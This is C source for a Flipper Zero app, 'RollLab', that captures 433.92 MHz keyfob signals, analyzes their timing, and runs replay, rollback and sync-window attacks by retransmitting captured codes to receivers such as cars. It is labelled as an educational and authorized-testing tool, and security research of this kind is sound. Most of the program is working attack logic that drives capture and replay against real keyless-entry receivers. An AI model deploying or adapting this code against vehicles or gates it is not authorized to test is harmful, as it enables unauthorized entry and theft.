// rolllab_app.c — Rolling Code Vulnerability Lab for Flipper Zero
//
// Educational tool for understanding rolling-code vulnerabilities:
//   1. Signal Analyzer   — capture & analyze timing, OOK/FSK heuristic, preamble
//   2. Replay Attack     — immediate capture + replay (tests basic replay protection)
//   3. Rollback Probe    — capture ref, advance receiver 1-3x, replay old code
//   4. Sync Window Probe — capture ref, advance receiver 5-15x, replay old code
//
// For authorized security testing, CTF, and educational research only.
// 433.92 MHz OOK/AM650 — internal CC1101, Momentum mntm-012 API 87.1
#include "rolllab_app.h"
#include "rolllab_rf.h"
#include <furi.h>
#include <gui/gui.h>
#include <gui/elements.h>
#include <input/input.h>
#include <notification/notification_messages.h>
#include <string.h>
#include <stdio.h>

static const char* const MENU_ITEMS[] = {
    "Analyze Signal",
    "Replay Attack",
    "Rollback Probe",
    "Sync Window Probe",
};
#define MENU_COUNT 4

// ---------------------------------------------------------------------------
// SIGNAL ANALYSIS
// ---------------------------------------------------------------------------
static void rlab_analyze(RollLabApp* app) {
    RLabAnalysis* a    = &app->analysis;
    const RLabRefSignal* sig = &app->ref_sig;

    *a = (RLabAnalysis){.min_us = UINT32_MAX};

    uint64_t sum      = 0;
    uint32_t sh_count = 0;

    // Silence-Terminator-Flanke (letzte Flanke, LOW, >= RLAB_SILENCE_US) aus der
    // Statistik ausschliessen — sie markiert nur das Signalende (RX-ready-Kriterium).
    size_t stat_count = sig->count;
    if(stat_count > 0) {
        uint32_t last = sig->buf[stat_count - 1];
        if(!(last & 0x80000000UL) && (last & 0x7FFFFFFFUL) >= RLAB_SILENCE_US) stat_count--;
    }

    for(size_t i = 0; i < stat_count; i++) {
        uint32_t dur = sig->buf[i] & 0x7FFFFFFFUL;
        if(!dur) continue;
        a->edge_count++;
        sum += dur;
        if(dur < a->min_us) a->min_us = dur;
        if(dur > a->max_us) a->max_us = dur;
    }

    if(!a->edge_count) return;
    a->avg_us = (uint32_t)(sum / a->edge_count);
    if(a->min_us == UINT32_MAX) a->min_us = 0;

    // Total signal time in ms (capped at 999 ms for display)
    uint64_t total_us = sum;
    a->total_ms = (uint32_t)(total_us / 1000 > 999 ? 999 : total_us / 1000);

    // Preamble: first edge is HIGH and > 3× average
    if(sig->count > 0 && (sig->buf[0] & 0x80000000UL)) {
        uint32_t first = sig->buf[0] & 0x7FFFFFFFUL;
        a->preamble_ok = (a->avg_us > 0) && (first > a->avg_us * 3);
    }

    // OOK heuristic: bi-modal duration distribution (short vs long pulses)
    if(a->max_us > a->min_us) {
        uint32_t thresh = a->min_us + (a->max_us - a->min_us) / 3;
        for(size_t i = 0; i < stat_count; i++) {
            uint32_t dur = sig->buf[i] & 0x7FFFFFFFUL;
            if(dur && dur <= thresh) sh_count++;
        }
        uint32_t pct = (sh_count * 100) / a->edge_count;
        a->looks_ook = (pct >= 25 && pct <= 75) && (a->max_us < a->min_us * 8);
    }
}

// ---------------------------------------------------------------------------
// DRAW CALLBACK
// ---------------------------------------------------------------------------
static void rlab_draw_cb(Canvas* canvas, void* ctx) {
    RollLabApp* app = ctx;
    canvas_clear(canvas);
    canvas_set_font(canvas, FontSecondary);

    switch(app->state) {

    case RLAB_MENU: {
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 2, 9, "RollLab Research");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 2, 17, "433.92 MHz  AM650");
        for(int i = 0; i < MENU_COUNT; i++) {
            int y = 28 + i * 10;
            if(i == (int)app->menu_idx) {
                canvas_draw_box(canvas, 0, y - 7, 128, 9);
                canvas_set_color(canvas, ColorWhite);
                canvas_draw_str(canvas, 3, y, MENU_ITEMS[i]);
                canvas_set_color(canvas, ColorBlack);
            } else {
                canvas_draw_str(canvas, 3, y, MENU_ITEMS[i]);
            }
        }
        break;
    }

    case RLAB_CAPTURING: {
        const char* titles[] = {
            "Capture: Analyze",
            "Capture: Replay",
            "Capture: Reference",
            "Capture: Reference",
        };
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 10, titles[app->mode]);
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 0, 23, "Point keyfob at Flipper");
        canvas_draw_str(canvas, 0, 33, "and press it once.");
        canvas_draw_str(canvas, 0, 46, app->status);
        elements_button_right(canvas, "Abort");
        break;
    }

    case RLAB_ANALYZE_VIEW: {
        RLabAnalysis* a = &app->analysis;
        char buf[32];
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 9, "Signal Analysis");
        canvas_set_font(canvas, FontSecondary);
        snprintf(buf, sizeof(buf), "Edges:%lu  T:%lums",
                 (unsigned long)a->edge_count, (unsigned long)a->total_ms);
        canvas_draw_str(canvas, 0, 21, buf);
        snprintf(buf, sizeof(buf), "Min:%-5lu Max:%-5lu us",
                 (unsigned long)a->min_us, (unsigned long)a->max_us);
        canvas_draw_str(canvas, 0, 31, buf);
        snprintf(buf, sizeof(buf), "Avg:%lu us", (unsigned long)a->avg_us);
        canvas_draw_str(canvas, 0, 41, buf);
        snprintf(buf, sizeof(buf), "%-8s Pre:%s",
                 a->looks_ook ? "OOK/PWM" : "non-OOK",
                 a->preamble_ok ? "YES" : " NO");
        canvas_draw_str(canvas, 0, 51, buf);
        elements_button_left(canvas, "Menu");
        elements_button_right(canvas, "Again");
        break;
    }

    case RLAB_REPLAY_READY: {
        char buf[32];
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 10, "Ready to Replay");
        canvas_set_font(canvas, FontSecondary);
        snprintf(buf, sizeof(buf), "Captured: %zu edges", app->ref_sig.count);
        canvas_draw_str(canvas, 0, 24, buf);
        canvas_draw_str(canvas, 0, 36, "Aim Flipper at receiver.");
        elements_button_center(canvas, "Replay");
        elements_button_left(canvas, "Menu");
        break;
    }

    case RLAB_REPLAYING: {
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 10, "Replaying...");
        canvas_set_font(canvas, FontSecondary);
        snprintf(app->status, sizeof(app->status), "TX %zu / %zu edges",
                 (size_t)app->tx_pos, app->ref_sig.count);
        canvas_draw_str(canvas, 0, 28, app->status);
        break;
    }

    case RLAB_ADVANCE: {
        char buf[40];
        const char* title = (app->mode == RLAB_MODE_ROLLBACK) ?
                            "Rollback: Advance RX" : "SyncWin: Drift RX";
        const char* line1 = (app->mode == RLAB_MODE_ROLLBACK) ?
                            "Press keyfob 1-3x" : "Press keyfob 5-15x";
        const char* line2 = (app->mode == RLAB_MODE_ROLLBACK) ?
                            "(car/rx must accept)" : "(far from receiver)";
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 10, title);
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 0, 22, line1);
        canvas_draw_str(canvas, 0, 31, line2);
        snprintf(buf, sizeof(buf), "Detected: %u press%s",
                 app->advance_count, app->advance_count == 1 ? "" : "es");
        canvas_draw_str(canvas, 0, 43, buf);
        elements_button_center(canvas, "Done");
        elements_button_right(canvas, "Abort");
        break;
    }

    case RLAB_PROBE_READY: {
        char buf[40];
        const char* title = (app->mode == RLAB_MODE_ROLLBACK) ?
                            "Rollback: Send Old" : "SyncWin: Send Old";
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 10, title);
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 0, 23, "Replaying reference code.");
        snprintf(buf, sizeof(buf), "Receiver advanced %u step%s.",
                 app->advance_count, app->advance_count == 1 ? "" : "s");
        canvas_draw_str(canvas, 0, 33, buf);
        canvas_draw_str(canvas, 0, 43, "Aim Flipper at receiver.");
        elements_button_center(canvas, "Send");
        elements_button_left(canvas, "Menu");
        break;
    }

    case RLAB_PROBING: {
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 10, "Probing...");
        canvas_set_font(canvas, FontSecondary);
        snprintf(app->status, sizeof(app->status), "TX %zu / %zu",
                 (size_t)app->tx_pos, app->ref_sig.count);
        canvas_draw_str(canvas, 0, 28, app->status);
        break;
    }

    case RLAB_RESULT: {
        char buf[44];
        const char* title = (app->mode == RLAB_MODE_ROLLBACK) ?
                            "Rollback Result" : "Sync Window Result";
        const char* verdict = (app->mode == RLAB_MODE_ROLLBACK) ?
                              "ROLLBACK VULNERABLE" : "LARGE SYNC WINDOW";
        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 0, 10, title);
        canvas_set_font(canvas, FontSecondary);
        snprintf(buf, sizeof(buf), "Sent code aged %u step%s.",
                 app->advance_count, app->advance_count == 1 ? "" : "s");
        canvas_draw_str(canvas, 0, 23, buf);
        canvas_draw_str(canvas, 0, 33, "If receiver accepted:");
        canvas_draw_box(canvas, 0, 43, 128, 10);
        canvas_set_color(canvas, ColorWhite);
        canvas_draw_str(canvas, 4, 51, verdict);
        canvas_set_color(canvas, ColorBlack);
        elements_button_left(canvas, "Menu");
        elements_button_right(canvas, "Again");
        break;
    }
    }
}

// ---------------------------------------------------------------------------
// INPUT CALLBACK
// ---------------------------------------------------------------------------
static void rlab_input_cb(InputEvent* ev, void* ctx) {
    RollLabApp* app = ctx;
    if(ev->type != InputTypeShort) return;

    if(ev->key == InputKeyBack) {
        app->abort = true;
        return;
    }

    switch(app->state) {
    case RLAB_MENU:
        if(ev->key == InputKeyUp && app->menu_idx > 0) app->menu_idx--;
        if(ev->key == InputKeyDown && app->menu_idx < MENU_COUNT - 1) app->menu_idx++;
        if(ev->key == InputKeyOk) {
            app->mode = (RollLabMode)app->menu_idx;
            app->state = RLAB_CAPTURING;
        }
        break;

    case RLAB_CAPTURING:
        if(ev->key == InputKeyRight) app->abort = true;
        break;

    case RLAB_ANALYZE_VIEW:
        if(ev->key == InputKeyLeft)  app->state = RLAB_MENU;
        if(ev->key == InputKeyRight) app->state = RLAB_CAPTURING;
        break;

    case RLAB_REPLAY_READY:
        if(ev->key == InputKeyLeft) app->state = RLAB_MENU;
        if(ev->key == InputKeyOk)   app->state = RLAB_REPLAYING;
        break;

    case RLAB_ADVANCE:
        if(ev->key == InputKeyRight) app->abort = true;
        if(ev->key == InputKeyOk)    app->state = RLAB_PROBE_READY;
        break;

    case RLAB_PROBE_READY:
        if(ev->key == InputKeyLeft) app->state = RLAB_MENU;
        if(ev->key == InputKeyOk)   app->state = RLAB_PROBING;
        break;

    case RLAB_RESULT:
        if(ev->key == InputKeyLeft) app->state = RLAB_MENU;
        if(ev->key == InputKeyRight) {
            // Retry: go back to advance phase with same reference
            app->advance_count = 0;
            app->state = RLAB_ADVANCE;
        }
        break;

    default:
        break;
    }
}

// ---------------------------------------------------------------------------
// ENTRY POINT
// ---------------------------------------------------------------------------
int32_t rolllab_app(void* p) {
    UNUSED(p);

    RollLabApp* app = malloc(sizeof(RollLabApp));
    furi_check(app);
    memset(app, 0, sizeof(RollLabApp));

    app->state     = RLAB_MENU;
    app->mode      = RLAB_MODE_ANALYZE;
    app->frequency = RLAB_FREQUENCY;
    app->abort     = false;
    app->rf_mode   = RLAB_RF_IDLE;

    rlab_rf_init(app);  // sets app->device = NULL on failure

    ViewPort* vp = view_port_alloc();
    view_port_draw_callback_set(vp, rlab_draw_cb, app);
    view_port_input_callback_set(vp, rlab_input_cb, app);
    Gui* gui = furi_record_open(RECORD_GUI);
    gui_add_view_port(gui, vp, GuiLayerFullscreen);
    NotificationApp* notif = furi_record_open(RECORD_NOTIFICATION);

    bool running = true;

    while(running) {
        // Global abort handler: clean up RF and return to menu (or exit)
        if(app->abort) {
            if(app->device && app->rf_mode != RLAB_RF_IDLE) {
                if(app->rf_mode == RLAB_RF_REPLAYING) {
                    rlab_replay_stop(app);
                } else {
                    rlab_capture_stop_any(app);
                }
            }
            if(app->state == RLAB_MENU) {
                running = false;
                break;
            }
            app->state = RLAB_MENU;
            app->abort = false;
        }

        // Device guard: if CC1101 unavailable, block RF-requiring states
        if(!app->device) {
            switch(app->state) {
            case RLAB_CAPTURING:
            case RLAB_REPLAYING:
            case RLAB_ADVANCE:
            case RLAB_PROBING:
                snprintf(app->status, sizeof(app->status), "ERR: CC1101 not found");
                app->state = RLAB_MENU;
                view_port_update(vp);
                furi_delay_ms(50);
                break;
            default:
                break;
            }
        }

        switch(app->state) {

        // ---- MENU ----
        case RLAB_MENU:
            view_port_update(vp);
            furi_delay_ms(50);
            break;

        // ---- CAPTURE (shared across modes) ----
        case RLAB_CAPTURING: {
            if(app->rf_mode != RLAB_RF_CAPTURING) {
                rlab_capture_ref_start(app);
                snprintf(app->status, sizeof(app->status), "Listening...");
            }
            snprintf(app->status, sizeof(app->status),
                     "Edges: %zu", app->ref_sig.count);
            view_port_update(vp);

            if(rlab_capture_ref_done(app)) {
                rlab_capture_ref_stop(app);
                notification_message(notif, &sequence_success);

                switch(app->mode) {
                case RLAB_MODE_ANALYZE:
                    rlab_analyze(app);
                    app->state = RLAB_ANALYZE_VIEW;
                    break;
                case RLAB_MODE_REPLAY:
                    app->state = RLAB_REPLAY_READY;
                    break;
                case RLAB_MODE_ROLLBACK:
                    app->advance_count  = 0;
                    app->advance_target = 3;
                    app->state = RLAB_ADVANCE;
                    break;
                case RLAB_MODE_SYNCWIN:
                    app->advance_count  = 0;
                    app->advance_target = 10;
                    app->state = RLAB_ADVANCE;
                    break;
                }
            }

            furi_delay_ms(20);
            break;
        }

        // ---- ANALYZE VIEW / REPLAY READY / PROBE READY ----
        case RLAB_ANALYZE_VIEW:
        case RLAB_REPLAY_READY:
        case RLAB_PROBE_READY:
        case RLAB_RESULT:
            // Ensure RF is stopped (may arrive here from an active state)
            if(app->rf_mode == RLAB_RF_CAPTURING) rlab_capture_work_stop(app);
            view_port_update(vp);
            furi_delay_ms(50);
            break;

        // ---- REPLAY ----
        case RLAB_REPLAYING: {
            rlab_replay_start(app);
            while(!app->abort && !rlab_replay_done(app)) {
                view_port_update(vp);
                furi_delay_ms(20);
            }
            rlab_replay_stop(app);
            if(!app->abort) {
                notification_message(notif, &sequence_success);
                app->state = RLAB_REPLAY_READY;
            } else {
                app->state = RLAB_MENU;
                app->abort = false;
            }
            view_port_update(vp);
            break;
        }

        // ---- ADVANCE (count keyfob presses via live RX) ----
        case RLAB_ADVANCE: {
            if(app->rf_mode != RLAB_RF_CAPTURING) {
                rlab_capture_work_start(app);
            }

            if(rlab_capture_work_done(app)) {
                // One press detected — stop, count, restart RX
                rlab_capture_work_stop(app);
                app->advance_count++;
                notification_message(notif, &sequence_success);
                furi_delay_ms(200);  // debounce
                if(app->state == RLAB_ADVANCE && !app->abort) {
                    rlab_capture_work_start(app);
                }
            }

            view_port_update(vp);
            furi_delay_ms(30);
            break;
        }

        // ---- PROBE (replay old reference code) ----
        case RLAB_PROBING: {
            if(app->rf_mode == RLAB_RF_CAPTURING) rlab_capture_work_stop(app);
            rlab_replay_start(app);
            while(!app->abort && !rlab_replay_done(app)) {
                view_port_update(vp);
                furi_delay_ms(20);
            }
            rlab_replay_stop(app);
            if(!app->abort) {
                notification_message(notif, &sequence_success);
                app->state = RLAB_RESULT;
            } else {
                app->state = RLAB_MENU;
                app->abort = false;
            }
            view_port_update(vp);
            break;
        }
        }
    }

    rlab_rf_deinit(app);
    gui_remove_view_port(gui, vp);
    view_port_free(vp);
    furi_record_close(RECORD_GUI);
    furi_record_close(RECORD_NOTIFICATION);
    free(app);
    return 0;
}
